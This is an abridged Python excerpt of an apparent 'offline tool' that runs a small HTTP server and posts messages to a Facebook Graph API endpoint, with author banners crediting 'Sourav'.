...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"THIS SERVER WAS CREATED BY SOURAV KIING")
...
def send_messages():
    ...
    def liness():
        print('\001b[37m' + '-------------------------OFFLINE_TOOL MADE BY XD SOURAV--------------------------')
    ...
    def msg():
        ...
        with contextlib.suppress(Exception):
            requests.post("https://graph.facebook.com/v15.0/1000752995/", data=parameters, headers=headers)
